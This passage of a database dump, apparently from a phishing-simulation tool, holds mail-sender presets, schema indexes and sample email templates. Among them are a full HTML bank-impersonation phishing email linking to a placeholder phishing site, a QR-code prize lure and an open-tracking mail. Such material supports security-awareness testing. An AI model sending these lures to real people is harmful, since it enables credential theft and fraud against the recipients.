('mail_sender', 'Microsoft (outlook.com/live.com)', '{\"dsn_type\":\"microsoft\",\"disp_note\":\"Note: Refer <a href=\'https://support.microsoft.com/en-us/office/pop-imap-and-smtp-settings-for-outlook-com-d088b986-291d-42b8-9564-9c414e2aa040\' target=\'_blank\'>https://support.microsoft.com/en-us/office/pop-imap-and-smtp-settings-for-outlook-com-d088b986-291d-42b8-9564-9c414e2aa040</a>\"}', '{\"from\":\"Name<username@outlook.com>\",\"username\":\"username@outlook.com\",\"mailbox\":{\"value\":\"{outlook.office365.com:993/imap/ssl/novalidate-cert}INBOX\",\"disabled\":true,\"checked\":true},\"smtp\":{\"value\":\"smtp.office365.com:587\",\"disabled\":false}}'),
('mail_template', 'My Bank', '{\"disp_note\":\"Desc: A sample HTML rich phishing mail\"}', '{\"mail_template_subject\":\"Important! Your consent is required\",\"mail_template_content\":\"<br><div><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\"><tbody><tr><td><br><\\/td><\\/tr><\\/tbody><\\/table><\\/div><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"600\\\"><tbody><tr><td bgcolor=\\\"#dcddde\\\" style=\\\"line-height:0px;background-color:#dcddde; border-left:1px solid #dcddde;\\\" valign=\\\"top\\\"><div><a data-original-title=\\\"Mark as smart link\\\" href=\\\"https:\\/\\/myphishingsite.com\\/page?rid={{RID}}\\\" rel=\\\"tooltip\\\" target=\\\"_blank\\\"><img src=\\\"https:\\/\\/user-images.githubusercontent.com\\/15928266\\/105949193-4518f300-60a7-11eb-87a9-6bb241003d92.jpg\\\" alt=\\\"\\\" class=\\\"fr-fic fr-dii\\\" width=\\\"100%\\\" border=\\\"0\\\"><\\/a><\\/div><\\/td><\\/tr><tr><td style=\\\"border-bottom:1px solid #cccccc;border-left:1px solid #cccccc;border-right:1px solid #cccccc;\\\"><table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\"><tbody><tr><td align=\\\"center\\\" valign=\\\"top\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\"><tbody><tr><td width=\\\"4%\\\"><br><\\/td><td valign=\\\"top\\\" width=\\\"92%\\\"><table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"width:100%!important;\\\" width=\\\"100%\\\"><tbody><tr><td align=\\\"center\\\" valign=\\\"top\\\"><div><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"width:100% !important;\\\" width=\\\"100%\\\"><tbody><tr><td height=\\\"20\\\"><br><\\/td><\\/tr><tr><td style=\\\"font-family:Arial; font-size:1em; line-height:22px; color:#595959;\\\">Dear {{NAME}},<\\/td><\\/tr><tr><td height=\\\"10\\\"><br><\\/td><\\/tr><tr><td style=\\\"font-family:Arial; font-size:1em; line-height:22px; color:#595959;\\\">We value our association with you and look forward to enhancing this relationship at every step.<\\/td><\\/tr><tr><td height=\\\"10\\\"><br><\\/td><\\/tr><tr><td style=\\\"font-family:Arial; font-size:1em; line-height:22px; color:#595959;\\\">We are delighted to inform you that you are a part of Platinum Banking Programme and to continue enjoying programme benefits, kindly provide your consent.<\\/td><\\/tr><tr><td height=\\\"10\\\"><br><\\/td><\\/tr><tr><td style=\\\"font-family:Arial; font-size:1em; line-height:22px; color:#595959;\\\">Here are few privileges of the programme, exclusively for you.<\\/td><\\/tr><tr><td style=\\\"text-align:center;\\\" valign=\\\"top\\\"><div align=\\\"center\\\" style=\\\"width:180px; display:inline-block; vertical-align:top;\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border-collapse:collapse!important;width:100%!important;\\\" width=\\\"100%\\\"><tbody><tr><td align=\\\"center\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\"><tbody><tr><td height=\\\"5\\\"><br><\\/td><\\/tr><tr><td align=\\\"center\\\" height=\\\"87\\\" style=\\\"vertical-align:middle !important;\\\" valign=\\\"middle\\\"><img src=\\\"https:\\/\\/user-images.githubusercontent.com\\/15928266\\/105949203-46e2b680-60a7-11eb-9a7f-c7a078cc4ca6.jpg\\\" alt=\\\"\\\" class=\\\"fr-fic fr-dii\\\" width=\\\"48\\\" height=\\\"48\\\" border=\\\"0\\\"><\\/td><\\/tr><tr><td align=\\\"center\\\" height=\\\"75\\\" style=\\\"font-family:Arial, Helvetica, sans-serif; line-height:22px; font-size:0.938em; color:#595959; text-align:center;\\\" valign=\\\"top\\\">Personalized attention from a dedicated Platinum Relationship Manager<\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><\\/tbody><\\/table><\\/div><div align=\\\"center\\\" style=\\\"width:180px; display:inline-block; vertical-align:top;\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border-collapse:collapse!important;width:100%!important;\\\" width=\\\"100%\\\"><tbody><tr><td align=\\\"center\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\"><tbody><tr><td height=\\\"5\\\"><br><\\/td><\\/tr><tr><td align=\\\"center\\\" height=\\\"87\\\" style=\\\"vertical-align:middle !important;\\\" valign=\\\"middle\\\"><img src=\\\"https:\\/\\/user-images.githubusercontent.com\\/15928266\\/105949204-46e2b680-60a7-11eb-8b0a-b175a65b5018.jpg\\\" alt=\\\"\\\" class=\\\"fr-fic fr-dii\\\" width=\\\"56\\\" height=\\\"52\\\" border=\\\"0\\\"><\\/td><\\/tr><tr><td align=\\\"center\\\" height=\\\"110\\\" style=\\\"font-family:Arial, Helvetica, sans-serif; line-height:22px; font-size:0.938em; color:#595959; text-align:center;\\\" valign=\\\"top\\\">ZERO cost on locker<br>rental<\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><\\/tbody><\\/table><\\/div><div align=\\\"center\\\" style=\\\"width:180px; display:inline-block; vertical-align:top;\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border-collapse:collapse!important;width:100%!important;\\\" width=\\\"100%\\\"><tbody><tr><td align=\\\"center\\\"><table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\"><tbody><tr><td height=\\\"5\\\"><br><\\/td><\\/tr><tr><td align=\\\"center\\\" height=\\\"87\\\" style=\\\"vertical-align:middle !important;\\\" valign=\\\"middle\\\"><img src=\\\"https:\\/\\/user-images.githubusercontent.com\\/15928266\\/105949205-477b4d00-60a7-11eb-9d32-41427f2c1601.jpg\\\" alt=\\\"\\\" class=\\\"fr-fic fr-dii\\\" width=\\\"53\\\" height=\\\"45\\\" border=\\\"0\\\"><\\/td><\\/tr><tr><td align=\\\"center\\\" height=\\\"110\\\" style=\\\"font-family:Arial, Helvetica, sans-serif; line-height:22px; font-size:0.938em; color:#595959; text-align:center;\\\" valign=\\\"top\\\">Special relationship rates for Loans and Forex transactions<\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><\\/tbody><\\/table><\\/div><\\/td><\\/tr><tr><td align=\\\"center\\\" valign=\\\"top\\\"><table align=\\\"center\\\" bgcolor=\\\"#0d4c8b\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"width:230px !important; border:1px solid #733943; border-radius:5px; background-color:#733943; font-size: 15px;\\\" width=\\\"230\\\"><tbody><tr><td align=\\\"center\\\" style=\\\"font-family:Arial, sans-serif; font-size:1.2em; color:#fff; text-align:center !important; border-radius:5px; background-color:#733943; padding:5px;\\\" valign=\\\"middle\\\"><a data-original-title=\\\"Mark as smart link\\\" href=\\\"{{landing_page}}?landingmid={{MID}}&landingrid={{RID}}\\\" rel=\\\"tooltip\\\" style=\\\"text-decoration:none; color:#fff; font-weight:500;\\\" target=\\\"_blank\\\">Platinum Banking Benefits<\\/a><\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><tr><td height=\\\"20\\\"><br><\\/td><\\/tr><tr><td align=\\\"center\\\" valign=\\\"top\\\"><table align=\\\"center\\\" bgcolor=\\\"#0d4c8b\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"width:200px !important; border:1px solid #733943; border-radius:5px; background-color:#733943; font-size: 15px;\\\" width=\\\"200\\\"><tbody><tr><td align=\\\"center\\\" style=\\\"font-family:Arial, sans-serif; font-size:1.2em; color:#fff; text-align:center !important; border-radius:5px; background-color:#733943; padding:5px;\\\" valign=\\\"middle\\\"><a data-original-title=\\\"Mark as smart link\\\" href=\\\"{{landing_page}}?landingmid={{MID}}&landingrid={{RID}}\\\" rel=\\\"tooltip\\\" style=\\\"text-decoration:none; color:#fff; font-weight:500;\\\" target=\\\"_blank\\\">Yes, I want to Continue<\\/a><\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><tr><td height=\\\"15\\\"><br><\\/td><\\/tr><tr><td height=\\\"20\\\"><br><\\/td><\\/tr><\\/tbody><\\/table><\\/div><\\/td><\\/tr><tr><td height=\\\"30\\\"><br><\\/td><\\/tr><tr><td align=\\\"left\\\" style=\\\"font-family:Arial; font-size:16px; letter-spacing: 1px; line-height:28px; color:#000000;\\\" valign=\\\"top\\\">Warm regards,<br><br><div><span style=\\\"font-weight: bold !important;\\\">Aaron Murakami<\\/span><br>Programme Manager<br>Platinum Premium Banking<\\/div><\\/td><\\/tr><tr><td height=\\\"15\\\"><br><\\/td><\\/tr><\\/tbody><\\/table><\\/td><td width=\\\"4%\\\"><br><\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><\\/tbody><\\/table><\\/td><\\/tr><tr><td align=\\\"left\\\" style=\\\"font-family:Arial, Helvetica, sans-serif; font-size:11px; line-height:16px; padding:10px 5px 5px 18px; color:#201d1e; text-align:left;\\\" valign=\\\"top\\\">*Terms &amp; Conditions apply | <a data-original-title=\\\"Mark as smart link\\\" href=\\\"https:\\/\\/myphishingsite.com\\/unsubscribe\\\" rel=\\\"tooltip\\\" style=\\\"text-decoration:underline; color:#0000ff;\\\" target=\\\"_blank\\\">Unsubscribe<\\/a><\\/td><\\/tr><tr><td style=\\\"font-family:Arial, Helvetica, sans-serif; font-size:12px; line-height:14px; padding:10px 0 5px 18px; color:#000000;\\\">*Based on Retail Loan book size (excluding mortgages). Source: Annual Reports as on 31<sup>st<\\/sup> March 2018 and No.1 on market capitalisation based on BSE data as on 22<sup>nd<\\/sup> May, 2018.<\\/td><\\/tr><\\/tbody><\\/table><div><br><\\/div><br>{{TRACKER}}\",\"timage_type\":1,\"mail_content_type\":\"text/html\",\"attachment\":[]}'),
('mail_sender', 'Postmark', '{\"dsn_type\":\"postmark\",\"disp_note\":\"Note: Provide the value of ID at \'SMTP Password\' field.\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_template', 'Scan me - QR', '{\"disp_note\":\"Desc: A QR based email. QR code is generated dynamicly\"}', '{\"mail_template_subject\":\"Lucky You\",\"mail_template_content\":\"Dear Customer,<br><br>Please scan the QR image shown below to confirm your prize!<br><br><img src=\\\"https:\\/\\/techowlphish.com\\/mod?type=qr_att&amp;content=<your text here>&amp;img_name=code.png\\\" class=\\\"fr-fic fr-dii\\\"><br><br>{{TRACKER}}\",\"timage_type\":1,\"mail_content_type\":\"text/html\",\"attachment\":[]}'),
('mail_sender', 'Sendgrid', '{\"dsn_type\":\"sendgrid\",\"disp_note\":\"Note: Provide value of KEY at \'SMTP Password\' field.\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_sender', 'Sendinblue', '{\"dsn_type\":\"sendinblue\",\"disp_note\":\"\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_template', 'Track me', '{\"disp_note\":\"Desc: A simple mail to track when the mail is opened\"}', '{\"mail_template_subject\":\"Thanks!\",\"mail_template_content\":\"Hi {{FNAME}},<br><br>Thank you for your email. We will meet soon.<br><br>Thanks &amp; Regards<br>Rose<br><br>{{TRACKER}}\",\"timage_type\":1,\"mail_content_type\":\"text/html\",\"attachment\":[]}'),
('mail_sender', 'Yahoo (yahoo.com/ymail.com) - SSL', '{\"dsn_type\":\"yahoo_ssl\",\"disp_note\":\"Note: You may need to turn on less secure apps. Refer <a href=\'https://help.yahoo.com/kb/access-yahoo-mail-third-party-apps-sln15241.html\' target=\'_blank\'>https://help.yahoo.com/kb/access-yahoo-mail-third-party-apps-sln15241.html</a>\"}', '{\"from\":\"Name<username@yahoo.com>\",\"username\":\"username@yahoo.com\",\"mailbox\":{\"value\":\"{imap.mail.yahoo.com:993/imap/ssl}INBOX\",\"disabled\":true,\"checked\":true},\"smtp\":{\"value\":\"smtp.mail.yahoo.com:465\",\"disabled\":false}}'),
('mail_sender', 'Yahoo (yahoo.com/ymail.com) - TLS', '{\"dsn_type\":\"yahoo_tls\",\"disp_note\":\"Note: You may need to turn on less secure apps. Refer <a href=\'https://help.yahoo.com/kb/access-yahoo-mail-third-party-apps-sln15241.html\' target=\'_blank\'>https://help.yahoo.com/kb/access-yahoo-mail-third-party-apps-sln15241.html</a>\"}', '{\"from\":\"Name<username@yahoo.com>\",\"username\":\"username@yahoo.com\",\"mailbox\":{\"value\":\"{imap.mail.yahoo.com:993/imap/ssl}INBOX\",\"disabled\":true,\"checked\":true},\"smtp\":{\"value\":\"smtp.mail.yahoo.com:587\",\"disabled\":false}}');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `tb_access_ctrl`
--
ALTER TABLE `tb_access_ctrl`
  ADD PRIMARY KEY (`tk_id`);

--
-- Indexes for table `tb_core_mailcamp_config`
--
ALTER TABLE `tb_core_mailcamp_config`
  ADD PRIMARY KEY (`mconfig_id`);

--
-- Indexes for table `tb_core_mailcamp_list`
--
ALTER TABLE `tb_core_mailcamp_list`
  ADD PRIMARY KEY (`campaign_id`),
  ADD UNIQUE KEY `id` (`campaign_id`);

--
-- Indexes for table `tb_core_mailcamp_sender_list`
--
ALTER TABLE `tb_core_mailcamp_sender_list`
  ADD PRIMARY KEY (`sender_list_id`),
  ADD UNIQUE KEY `sender_list_id` (`sender_list_id`);

--
-- Indexes for table `tb_core_mailcamp_template_list`
--
ALTER TABLE `tb_core_mailcamp_template_list`
  ADD PRIMARY KEY (`mail_template_id`);

--
-- Indexes for table `tb_core_mailcamp_user_group`
--
ALTER TABLE `tb_core_mailcamp_user_group`
  ADD PRIMARY KEY (`user_group_id`);

--
-- Indexes for table `tb_core_quick_tracker_list`
--
ALTER TABLE `tb_core_quick_tracker_list`
  ADD PRIMARY KEY (`tracker_id`);

--
-- Indexes for table `tb_core_web_tracker_list`
--
ALTER TABLE `tb_core_web_tracker_list`
  ADD PRIMARY KEY (`tracker_id`),
  ADD UNIQUE KEY `id_2` (`tracker_id`),
  ADD KEY `id` (`tracker_id`),
  ADD KEY `id_3` (`tracker_id`);

--
-- Indexes for table `tb_data_mailcamp_live`
--
ALTER TABLE `tb_data_mailcamp_live`
  ADD PRIMARY KEY (`rid`);

--
-- Indexes for table `tb_data_quick_tracker_live`
--
ALTER TABLE `tb_data_quick_tracker_live`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_data_webform_submit`
--
ALTER TABLE `tb_data_webform_submit`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_data_webpage_visit`
--
ALTER TABLE `tb_data_webpage_visit`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_domains`
--
ALTER TABLE `tb_domains`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_hf_list`
--
ALTER TABLE `tb_hf_list`
  ADD PRIMARY KEY (`hf_id`);

--
-- Indexes for table `tb_hland_page_list`
--
ALTER TABLE `tb_hland_page_list`
  ADD PRIMARY KEY (`hlp_id`);

--
-- Indexes for table `tb_ht_list`
--
ALTER TABLE `tb_ht_list`
  ADD PRIMARY KEY (`ht_id`);

--
-- Indexes for table `tb_log`
--
ALTER TABLE `tb_log`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_mail_verify`
--
ALTER TABLE `tb_mail_verify`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_main`
--
ALTER TABLE `tb_main`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_main_cron`
--
ALTER TABLE `tb_main_cron`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_main_variables`
--
ALTER TABLE `tb_main_variables`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_pl_list`
--
ALTER TABLE `tb_pl_list`
  ADD PRIMARY KEY (`pl_id`);

--
-- Indexes for table `tb_store`
--
ALTER TABLE `tb_store`
  ADD PRIMARY KEY (`name`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `tb_data_quick_tracker_live`
--
ALTER TABLE `tb_data_quick_tracker_live`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tb_data_webform_submit`
--
ALTER TABLE `tb_data_webform_submit`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tb_data_webpage_visit`
--
ALTER TABLE `tb_data_webpage_visit`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tb_domains`
--
ALTER TABLE `tb_domains`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `tb_log`
--
ALTER TABLE `tb_log`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `tb_mail_verify`
--
ALTER TABLE `tb_mail_verify`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=70;

--
-- AUTO_INCREMENT for table `tb_main`
--
ALTER TABLE `tb_main`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `tb_main_cron`
--
ALTER TABLE `tb_main_cron`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
